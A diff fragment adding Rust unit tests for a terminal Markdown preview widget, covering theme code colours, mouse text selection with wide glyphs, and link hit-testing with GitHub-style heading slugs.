+            .find(|t| t.syntax().fg != crate::theme::SyntaxPalette::BASE16.fg)
+            .expect("a bundled theme with a non-Base16 code palette");
+        let (r, g, b) = theme.syntax().fg;
+        let lines = render_markdown(
+            "```notalanguage\nplain code line\n```\n",
+            theme,
+            &mut LangRegistry::new(),
+        );
+        let code = lines
+            .iter()
+            .flat_map(|l| l.spans.iter())
+            .find(|s| s.content.as_ref() == "plain code line")
+            .expect("the code line must render");
+        assert_eq!(
+            code.style.fg,
+            Some(Color::Rgb(r, g, b)),
+            "unhighlighted code must wear the theme's code fg, not Base16 slate"
+        );
+    }
+}
+
+#[cfg(test)]
+mod preview_selection_tests {
+    use super::*;
+
+    fn preview(rows: &[&str]) -> MarkdownPreview {
+        MarkdownPreview {
+            lines: Vec::new(),
+            scroll: 0,
+            built_seq: 0,
+            images: Vec::new(),
+            anchor_rows: Vec::new(),
+            runnables: Vec::new(),
+            run_rows: Vec::new(),
+            wrap_key: (0, 0),
+            last_area: ratatui::layout::Rect::default(),
+            rows: rows
+                .iter()
+                .map(|r| r.chars().map(|c| c.to_string()).collect())
+                .collect(),
+            selection: None,
+            dragging: false,
+            notebook: false,
+            doc_path: None,
+            media: false,
+            source_map: Vec::new(),
+            row_of_line: Vec::new(),
+            scroll_to_source: None,
+            links: MdLinks::default(),
+            follows: None,
+        }
+    }
+
+    /// Issue #215: the rendered Markdown view must be selectable. A drag
+    /// within one row copies that span; a multi-row drag keeps the visual
+    /// line structure; the selection is direction-agnostic.
+    #[test]
+    fn selection_text_extracts_the_rendered_rows() {
+        let mut p = preview(&["Hello world", "second line", "third line"]);
+        // Single row, columns 0..=4 -> "Hello".
+        p.selection = Some(((0, 0), (0, 4)));
+        assert_eq!(p.selection_text(), "Hello");
+        // Multi-row: tail of row 0, all of row 1, head of row 2.
+        p.selection = Some(((0, 6), (2, 4)));
+        assert_eq!(p.selection_text(), "world\nsecond line\nthird");
+        // Dragging upward selects the same span.
+        p.selection = Some(((2, 4), (0, 6)));
+        assert_eq!(p.selection_text(), "world\nsecond line\nthird");
+        // No selection copies nothing.
+        p.selection = None;
+        assert_eq!(p.selection_text(), "");
+        assert!(!p.has_selection());
+    }
+
+    /// Review round 1: a plain click (anchor == head) is a caret, not a
+    /// selection: nothing tints and nothing copies.
+    #[test]
+    fn a_zero_area_click_is_not_a_selection() {
+        let mut p = preview(&["abcdef"]);
+        p.selection = Some(((0, 3), (0, 3)));
+        assert!(!p.has_selection(), "a click selects nothing");
+        assert!(!p.cell_selected(0, 3), "and tints nothing");
+        assert_eq!(p.selection_text(), "", "and copies nothing");
+    }
+
+    /// Review round 1: rows are stored per SCREEN COLUMN, so a wide glyph
+    /// (which owns one column and leaves an empty continuation cell) is
+    /// copied whole and the columns after it still address the right
+    /// characters.
+    #[test]
+    fn wide_glyphs_keep_columns_and_characters_aligned() {
+        // Columns:      0     1(cont) 2    3
+        let mut p = preview(&[""]);
+        p.rows = vec![vec![
+            "\u{5e83}".to_string(),
+            String::new(),
+            "a".to_string(),
+            "b".to_string(),
+        ]];
+        p.selection = Some(((0, 0), (0, 2)));
+        assert_eq!(
+            p.selection_text(),
+            "\u{5e83}a",
+            "the wide glyph and the character at column 2 come through"
+        );
+        p.selection = Some(((0, 2), (0, 3)));
+        assert_eq!(
+            p.selection_text(),
+            "ab",
+            "columns after a wide glyph still address their own characters"
+        );
+    }
+
+    #[test]
+    fn cell_selected_marks_exactly_the_dragged_cells() {
+        let mut p = preview(&["abcdef", "ghijkl"]);
+        p.selection = Some(((0, 2), (1, 1)));
+        assert!(!p.cell_selected(0, 1), "before the anchor column");
+        assert!(p.cell_selected(0, 2), "the anchor cell");
+        assert!(p.cell_selected(0, 5), "to the end of the first row");
+        assert!(p.cell_selected(1, 0), "the head row from column 0");
+        assert!(p.cell_selected(1, 1), "up to the head column");
+        assert!(!p.cell_selected(1, 2), "past the head column");
+        assert!(!p.cell_selected(2, 0), "below the selection");
+    }
+
+    /// A selection that outlives a rebuild (fewer rows) must not panic or
+    /// invent text.
+    #[test]
+    fn selection_past_the_rendered_rows_is_harmless() {
+        let mut p = preview(&["only row"]);
+        p.selection = Some(((0, 2), (9, 40)));
+        assert_eq!(p.selection_text(), "ly row");
+    }
+
+    /// #931: a link keeps its destination and is hit exactly on the cells
+    /// that paint it, wrapped and scrolled; headings slug as GitHub's do.
+    #[test]
+    fn links_hit_where_they_paint_and_headings_slug_like_github() {
+        let md =
+            "# Usage notes\n\nSee [the setup guide](docs/SETUP.md) and [](x).\n\n## Usage notes!\n";
+        let mut reg = LangRegistry::new();
+        let (lines, _, _, _, links) =
+            render_markdown_mapped(md, Theme::BLACK, &mut reg, None, BlockOutputs::new());
+        assert_eq!(
+            links.links.len(),
+            1,
+            "an empty link draws nothing to follow"
+        );
+        assert_eq!(links.links[0].dest, "docs/SETUP.md");
+        let slugs = [
+            ("usage-notes".to_string(), 0),
+            ("usage-notes-1".to_string(), 4),
+        ];
+        assert_eq!(links.headings, slugs);
+        let mut p = preview(&[]);
+        p.last_area = Rect::new(0, 0, 12, 8);
+        let mut row = 0;
+        for l in &lines {
+            p.row_of_line.push(row);
+            row += Paragraph::new(l.clone())
+                .wrap(Wrap { trim: false })
+                .line_count(12)
+                .max(1);
+        }
+        (p.lines, p.links) = (lines, links);
+        for scroll in [0, 2] {
+            p.scroll = scroll;
+            let mut buf = Buffer::empty(p.last_area);
+            let para = Paragraph::new(p.lines.clone()).wrap(Wrap { trim: false });
+            para.scroll((scroll, 0)).render(p.last_area, &mut buf);
+            let hits: Vec<(u16, u16)> = (0..8)
+                .flat_map(|y| (0..12).map(move |x| (x, y)))
+                .filter(|&(x, y)| p.link_at(x, y) == Some(0))
+                .collect();
+            let text: String = hits.iter().map(|&c| buf[c].symbol()).collect();
+            assert_eq!(text.split_whitespace().collect::<String>(), "thesetupguide");
+            assert!(hits.last().unwrap().1 > hits[0].1, "the link wraps");
+        }
+        assert!(p.scroll_to_heading("Usage-Notes-1"));
+        assert_eq!(p.scroll_to_source, Some(4));
+        assert!(!p.scroll_to_heading("nope"));
+    }
+}
